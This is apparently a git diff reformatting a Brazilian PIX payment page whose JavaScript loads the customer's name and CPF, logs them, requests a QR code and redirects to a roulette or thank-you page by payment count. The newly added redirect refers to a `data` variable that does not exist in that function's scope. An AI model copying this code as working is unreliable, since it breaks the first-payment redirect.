+            background: "white",
+            foreground: "black",
+          });
+
+          // Converter canvas para imagem e definir como src
+          const qrCodeImage = document.getElementById("qrCodeImage");
+          qrCodeImage.src = canvas.toDataURL();
+          qrCodeImage.style.display = "block";
+        } catch (error) {
+          console.error("Erro ao gerar QR Code:", error);
+          // Fallback: mostrar o payload como texto
+          document.getElementById("qrCodeImage").style.display = "none";
+          document.querySelector(".qr-code").innerHTML =
+            '<p style="font-size: 12px; word-break: break-all;">' +
+            pixPayload +
+            "</p>";
+        }
+      }
+
+      // Variável global para armazenar o transactionId
+      let currentTransactionId = "";
+      let paymentCheckInterval = null;
+      let isPaymentConfirmed = false;
+
+      // Limpa qualquer cache de transação anterior
+      localStorage.removeItem("currentTransactionId");
+
+      // Carrega os dados PIX do backend com dados do cliente
+      async function loadPixData() {
+        try {
+          // Obter valor da URL se fornecido
+          const urlValue = getUrlParameter("value");
+          let paymentValue = 6.0; // Valor padrão
+
+          if (urlValue) {
+            paymentValue = parseFloat(urlValue);
+            // Atualizar o valor na interface antes de carregar os dados
+            const amountElement = document.getElementById("amountValue");
+            const instructionElement =
+              document.getElementById("instructionAmount");
+
+            if (amountElement) {
+              amountElement.textContent = paymentValue.toFixed(2);
             }
-        }
-
-        // Variável global para armazenar o transactionId
-        let currentTransactionId = '';
-        let paymentCheckInterval = null;
-        let isPaymentConfirmed = false;
-        
-        // Limpa qualquer cache de transação anterior
-        localStorage.removeItem('currentTransactionId');
-
-        // Carrega os dados PIX do backend com dados do cliente
-        async function loadPixData() {
-            try {
-                // Obter valor da URL se fornecido
-                const urlValue = getUrlParameter('value');
-                let paymentValue = 6.00; // Valor padrão
-                
-                if (urlValue) {
-                    paymentValue = parseFloat(urlValue);
-                    // Atualizar o valor na interface antes de carregar os dados
-                    const amountElement = document.getElementById('amountValue');
-                    const instructionElement = document.getElementById('instructionAmount');
-                    
-                    if (amountElement) {
-                        amountElement.textContent = paymentValue.toFixed(2);
-                    }
-                    if (instructionElement) {
-                        instructionElement.textContent = paymentValue.toFixed(2);
-                    }
-                }
-                
-                // 🔁 OBTÉM dados reais do localStorage
-                const realUserData = JSON.parse(localStorage.getItem('userData') || '{}');
-                console.log(realUserData)
-                
-                // Prepara os dados para enviar via POST
-                const customerData = {
-                    name: realUserData.nome || 'Cliente Teste',
-                    cpf: realUserData.cpf || '12345678901',
-                    email: 'cliente@teste.com', // Email fixo
-                    phone: '11999999999', // Telefone fixo
-                    value: paymentValue // Adicionar o valor do pagamento
-                };
-                
-                // Envia dados via POST para a API
-                const response = await fetch('pix_api_real.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(customerData)
-                });
-                
-                const data = await response.json();
-
-                // Atualiza informações do cliente
-                if (data.customerName && data.customerCpf) {
-                    const customerNameElement = document.getElementById('customerName');
-                    const customerCpfElement = document.getElementById('customerCpf');
-                    const customerInfoElement = document.getElementById('customerInfo');
-                    
-                    if (customerNameElement) customerNameElement.textContent = data.customerName;
-                    if (customerCpfElement) customerCpfElement.textContent = data.customerCpf;
-                    if (customerInfoElement) customerInfoElement.style.display = 'block';
-                }
-
-                // Gera o QR Code a partir do payload PIX
-                if (data.pixKey) {
-                    generateQRCode(data.pixKey);
-                }
-
-                // Atualiza a chave PIX
-                const pixKeyElement = document.getElementById('pixKey');
-                if (pixKeyElement) {
-                    pixKeyElement.value = data.pixKey;
-                }
-
-                // Armazena o transactionId globalmente
-                if (data.transactionId) {
-                    currentTransactionId = data.transactionId;
-                    const transactionIdElement = document.getElementById('transactionId');
-                    if (transactionIdElement) {
-                        transactionIdElement.textContent = data.transactionId;
-                    }
-                }
-
-                // Atualiza valor
-                if (data.amount) {
-                    const formattedAmount = (data.amount / 100).toFixed(2);
-                    const amountElement = document.getElementById('amountValue');
-                    if (amountElement) {
-                        amountElement.textContent = formattedAmount;
-                    }
-                }
-
-                // Atualiza data de expiração
-                if (data.expirationDate) {
-                    const expDate = new Date(data.expirationDate);
-                    const expirationDateElement = document.getElementById('expirationDate');
-                    if (expirationDateElement) {
-                        expirationDateElement.textContent =
-                            expDate.toLocaleDateString('pt-BR') + ' às ' + expDate.toLocaleTimeString('pt-BR');
-                    }
-                }
-
-                // Esconde o loading e mostra o conteúdo
-                const loadingMessageElement = document.getElementById('loadingMessage');
-                const pixContentElement = document.getElementById('pixContent');
-                
-                if (loadingMessageElement) loadingMessageElement.style.display = 'none';
-                if (pixContentElement) pixContentElement.style.display = 'block';
-
-                // Inicia o timer para mostrar o botão de confirmação após 5 segundos
-                setTimeout(function() {
-                    const confirmBtnElement = document.getElementById('confirmBtn');
-                    if (confirmBtnElement) {
-                        confirmBtnElement.style.display = 'flex';
-                    }
-                }, 5000);
-
-                // Inicia a verificação automática de pagamento a cada 10 segundos
-                startPaymentStatusCheck();
-                
-            } catch (error) {
-                console.error('Erro ao carregar dados PIX:', error);
-                const loadingMessageElement = document.getElementById('loadingMessage');
-                if (loadingMessageElement) {
-                    loadingMessageElement.innerHTML = 'Erro ao carregar dados PIX. Tente novamente.';
-                }
+            if (instructionElement) {
+              instructionElement.textContent = paymentValue.toFixed(2);
             }
-        }
+          }
 
-        // Função para iniciar a verificação automática de status de pagamento
-        function startPaymentStatusCheck() {
-               console.log(currentTransactionId)  
-          if (!currentTransactionId || isPaymentConfirmed) return;
-            
-            paymentCheckInterval = setInterval(async function() {
+          // 🔁 OBTÉM dados reais do localStorage
+          const realUserData = JSON.parse(
+            localStorage.getItem("userData") || "{}"
+          );
+          console.log(realUserData);
 
-                if (isPaymentConfirmed) {
-                    clearInterval(paymentCheckInterval);
-                    return;
-                }
-                
-                try {
-                    const checkStatusUrl = `pix_api_real.php?action=check_status&transaction_id=${currentTransactionId}&_t=${new Date().getTime()}`;
-                    const response = await fetch(checkStatusUrl);
-                    const data = await response.json();
-                              console.log(data) 
+          // Prepara os dados para enviar via POST
+          const customerData = {
+            name: realUserData.nome || "Cliente Teste",
+            cpf: realUserData.cpf || "12345678901",
+            email: "cliente@teste.com", // Email fixo
+            phone: "11999999999", // Telefone fixo
+            value: paymentValue, // Adicionar o valor do pagamento
+          };
 
-                    if (data.status === 'paid') {
-                        handlePaymentSuccess();
-                    }
-                } catch (error) {
-                    console.error('Erro na verificação automática:', error);
-                }
-            }, 10000); // Verifica a cada 10 segundos
-        }
+          // Envia dados via POST para a API
+          const response = await fetch("pix_api_real.php", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(customerData),
+          });
 
-        // Função para lidar com o sucesso do pagamento
-        function handlePaymentSuccess() {
-            if (isPaymentConfirmed) return; // Evita execução múltipla
-            
-            isPaymentConfirmed = true;
-            
-            // Para a verificação automática
-            if (paymentCheckInterval) {
-                clearInterval(paymentCheckInterval);
+          const data = await response.json();
+
+          // Atualiza informações do cliente
+          if (data.customerName && data.customerCpf) {
+            const customerNameElement = document.getElementById("customerName");
+            const customerCpfElement = document.getElementById("customerCpf");
+            const customerInfoElement = document.getElementById("customerInfo");
+
+            if (customerNameElement)
+              customerNameElement.textContent = data.customerName;
+            if (customerCpfElement)
+              customerCpfElement.textContent = data.customerCpf;
+            if (customerInfoElement)
+              customerInfoElement.style.display = "block";
+          }
+
+          // Gera o QR Code a partir do payload PIX
+          if (data.pixKey) {
+            generateQRCode(data.pixKey);
+          }
+
+          // Atualiza a chave PIX
+          const pixKeyElement = document.getElementById("pixKey");
+          if (pixKeyElement) {
+            pixKeyElement.value = data.pixKey;
+          }
+
+          // Armazena o transactionId globalmente
+          if (data.transactionId) {
+            currentTransactionId = data.transactionId;
+            const transactionIdElement =
+              document.getElementById("transactionId");
+            if (transactionIdElement) {
+              transactionIdElement.textContent = data.transactionId;
             }
-            
-            // Esconde o botão de confirmação
-            document.getElementById('confirmBtn').style.display = 'none';
-            
-            // Mostra a mensagem de sucesso
-            const successMessage = document.getElementById('successMessage');
-            successMessage.classList.add('show');
-            
-            // Aguarda 3 segundos e então mostra o redirecionamento
-            setTimeout(function() {
-                // Esconde a mensagem de sucesso
-                successMessage.classList.remove('show');
-                
-                // Mostra a mensagem de redirecionamento
-                const redirectMessage = document.getElementById('redirectMessage');
-                redirectMessage.classList.add('show');
-                
-                // Inicia o countdown de 3 segundos
-                let countdown = 3;
-                const countdownElement = document.getElementById('redirectCountdown');
-                
-                const countdownInterval = setInterval(function() {
-                    countdown--;
-                    countdownElement.textContent = countdown;
-                    
-                    if (countdown <= 0) {
-                        clearInterval(countdownInterval);
-                        
-                        // Verifica quantos pagamentos já foram feitos
-                        let paymentCount = parseInt(localStorage.getItem('paymentCount') || '0');
-                        paymentCount++;
-                        localStorage.setItem('paymentCount', paymentCount.toString());
-                        
-                        // Redireciona baseado no número de pagamentos
-                        if (paymentCount === 1) {
-                            // Primeiro pagamento - vai para roleta
-                            window.location.href = '../roleta/';
-                        } else {
-                            // Segundo pagamento ou mais - vai para obrigado
-                            window.location.href = '../obrigado/';
-                        }
-                    }
-                }, 1000);
-                
-            }, 3000);
-        }
+          }
 
-        // Copia a chave PIX para a área de transferência
-        function copyPixKey() {
-            const pixKeyInput = document.getElementById('pixKey');
-            const copyBtn = document.querySelector('.copy-btn');
-            const copyText = document.getElementById('copyText');
-
-            pixKeyInput.select();
-            pixKeyInput.setSelectionRange(0, 99999);
-
-            navigator.clipboard.writeText(pixKeyInput.value).then(function() {
-                copyBtn.classList.add('copied');
-                copyText.textContent = 'Copiado!';
-                setTimeout(function() {
-                    copyBtn.classList.remove('copied');
-                    copyText.textContent = 'Copiar';
-                }, 2000);
-            }).catch(function(err) {
-                console.error('Erro ao copiar: ', err);
-                alert('Erro ao copiar. Tente selecionar e copiar manualmente.');
-            });
-        }
-
-        // Confirma o pagamento (mantém a funcionalidade original)
-        async function confirmPayment() {
-     
-            if (!currentTransactionId) {
-                alert('ID da transação não encontrado. Por favor, recarregue a página.');
-                return;
+          // Atualiza valor
+          if (data.amount) {
+            const formattedAmount = (data.amount / 100).toFixed(2);
+            const amountElement = document.getElementById("amountValue");
+            if (amountElement) {
+              amountElement.textContent = formattedAmount;
             }
+          }
 
-            try {
-                const checkStatusUrl = `pix_api_real.php?action=check_status&transaction_id=${currentTransactionId}&_t=${new Date().getTime()}`;
-                const response = await fetch(checkStatusUrl);
-                const data = await response.json();
-
-                if (data.status === 'paid') {
-                    handlePaymentSuccess();
-                } else if (data.status === 'pending') {
-                    document.getElementById('pendingPaymentPopup').style.display = 'flex';
-                } else {
-                    alert('Status de pagamento desconhecido: ' + data.status);
-                }
-            } catch (error) {
-                console.error('Erro ao verificar status do pagamento:', error);
-                alert('Não foi possível verificar o status do pagamento. Tente novamente.');
+          // Atualiza data de expiração
+          if (data.expirationDate) {
+            const expDate = new Date(data.expirationDate);
+            const expirationDateElement =
+              document.getElementById("expirationDate");
+            if (expirationDateElement) {
+              expirationDateElement.textContent =
+                expDate.toLocaleDateString("pt-BR") +
+                " às " +
+                expDate.toLocaleTimeString("pt-BR");
             }
+          }
+
+          // Esconde o loading e mostra o conteúdo
+          const loadingMessageElement =
+            document.getElementById("loadingMessage");
+          const pixContentElement = document.getElementById("pixContent");
+
+          if (loadingMessageElement)
+            loadingMessageElement.style.display = "none";
+          if (pixContentElement) pixContentElement.style.display = "block";
+
+          // Inicia o timer para mostrar o botão de confirmação após 5 segundos
+          setTimeout(function () {
+            const confirmBtnElement = document.getElementById("confirmBtn");
+            if (confirmBtnElement) {
+              confirmBtnElement.style.display = "flex";
+            }
+          }, 5000);
+
+          // Inicia a verificação automática de pagamento a cada 10 segundos
+          startPaymentStatusCheck();
+        } catch (error) {
+          console.error("Erro ao carregar dados PIX:", error);
+          const loadingMessageElement =
+            document.getElementById("loadingMessage");
+          if (loadingMessageElement) {
+            loadingMessageElement.innerHTML =
+              "Erro ao carregar dados PIX. Tente novamente.";
+          }
+        }
+      }
+
+      // Função para iniciar a verificação automática de status de pagamento
+      function startPaymentStatusCheck() {
+        console.log(currentTransactionId);
+        if (!currentTransactionId || isPaymentConfirmed) return;
+
+        paymentCheckInterval = setInterval(async function () {
+          if (isPaymentConfirmed) {
+            clearInterval(paymentCheckInterval);
+            return;
+          }
+
+          try {
+            const checkStatusUrl = `pix_api_real.php?action=check_status&transaction_id=${currentTransactionId}&_t=${new Date().getTime()}`;
+            const response = await fetch(checkStatusUrl);
+            const data = await response.json();
+            console.log(data);
+
+            if (data.status === "paid") {
+              handlePaymentSuccess();
+            }
+          } catch (error) {
+            console.error("Erro na verificação automática:", error);
+          }
+        }, 10000); // Verifica a cada 10 segundos
+      }
+
+      // Função para lidar com o sucesso do pagamento
+      function handlePaymentSuccess() {
+        if (isPaymentConfirmed) return; // Evita execução múltipla
+
+        isPaymentConfirmed = true;
+
+        // Para a verificação automática
+        if (paymentCheckInterval) {
+          clearInterval(paymentCheckInterval);
         }
 
-        // Fecha o pop-up
-        function closePopup() {
-            document.getElementById('pendingPaymentPopup').style.display = 'none';
+        // Esconde o botão de confirmação
+        document.getElementById("confirmBtn").style.display = "none";
+
+        // Mostra a mensagem de sucesso
+        const successMessage = document.getElementById("successMessage");
+        successMessage.classList.add("show");
+
+        // Aguarda 3 segundos e então mostra o redirecionamento
+        setTimeout(function () {
+          // Esconde a mensagem de sucesso
+          successMessage.classList.remove("show");
+
+          // Mostra a mensagem de redirecionamento
+          const redirectMessage = document.getElementById("redirectMessage");
+          redirectMessage.classList.add("show");
+
+          // Inicia o countdown de 3 segundos
+          let countdown = 3;
+          const countdownElement = document.getElementById("redirectCountdown");
+
+          const countdownInterval = setInterval(function () {
+            countdown--;
+            countdownElement.textContent = countdown;
+
+            if (countdown <= 0) {
+              clearInterval(countdownInterval);
+
+              // Verifica quantos pagamentos já foram feitos
+              let paymentCount = parseInt(
+                localStorage.getItem("paymentCount") || "0"
+              );
+              paymentCount++;
+              localStorage.setItem("paymentCount", paymentCount.toString());
+
+              // Redireciona baseado no número de pagamentos
+              if (paymentCount === 1) {
+                // Primeiro pagamento - vai para roleta
+                // window.location.href = '../roleta/';
+
+                const amount = data.amount / 100; // valor formatado
+
+                // no redirecionamento:
+                window.location.href = `../roleta/?amount=${encodeURIComponent(
+                  amount
+                )}`;
+              } else {
+                // Segundo pagamento ou mais - vai para obrigado
+                window.location.href = "../obrigado/";
+              }
+            }
+          }, 1000);
+        }, 3000);
+      }
+
+      // Copia a chave PIX para a área de transferência
+      function copyPixKey() {
+        const pixKeyInput = document.getElementById("pixKey");
+        const copyBtn = document.querySelector(".copy-btn");
+        const copyText = document.getElementById("copyText");
+
+        pixKeyInput.select();
+        pixKeyInput.setSelectionRange(0, 99999);
+
+        navigator.clipboard
+          .writeText(pixKeyInput.value)
+          .then(function () {
+            copyBtn.classList.add("copied");
+            copyText.textContent = "Copiado!";
+            setTimeout(function () {
+              copyBtn.classList.remove("copied");
+              copyText.textContent = "Copiar";
+            }, 2000);
+          })
+          .catch(function (err) {
+            console.error("Erro ao copiar: ", err);
+            alert("Erro ao copiar. Tente selecionar e copiar manualmente.");
+          });
+      }
+
+      // Confirma o pagamento (mantém a funcionalidade original)
+      async function confirmPayment() {
+        if (!currentTransactionId) {
+          alert(
+            "ID da transação não encontrado. Por favor, recarregue a página."
+          );
+          return;
         }
 
-        // Carrega os dados PIX quando a página é carregada
-        window.addEventListener('load', function() {
-            loadPixData();
-        });
+        try {
+          const checkStatusUrl = `pix_api_real.php?action=check_status&transaction_id=${currentTransactionId}&_t=${new Date().getTime()}`;
+          const response = await fetch(checkStatusUrl);
+          const data = await response.json();
 
-        // Limpa o intervalo quando a página é fechada
-        window.addEventListener('beforeunload', function() {
-            if (paymentCheckInterval) {
-                clearInterval(paymentCheckInterval);
-            }
-        });
+          if (data.status === "paid") {
+            handlePaymentSuccess();
+          } else if (data.status === "pending") {
+            document.getElementById("pendingPaymentPopup").style.display =
+              "flex";
+          } else {
+            alert("Status de pagamento desconhecido: " + data.status);
+          }
+        } catch (error) {
+          console.error("Erro ao verificar status do pagamento:", error);
+          alert(
+            "Não foi possível verificar o status do pagamento. Tente novamente."
+          );
+        }
+      }
+
+      // Fecha o pop-up
+      function closePopup() {
+        document.getElementById("pendingPaymentPopup").style.display = "none";
+      }
+
+      // Carrega os dados PIX quando a página é carregada
+      window.addEventListener("load", function () {
+        loadPixData();
+      });
+
+      // Limpa o intervalo quando a página é fechada
+      window.addEventListener("beforeunload", function () {
+        if (paymentCheckInterval) {
+          clearInterval(paymentCheckInterval);
+        }
+      });
     </script>
-</body>
+  </body>
 </html>
-
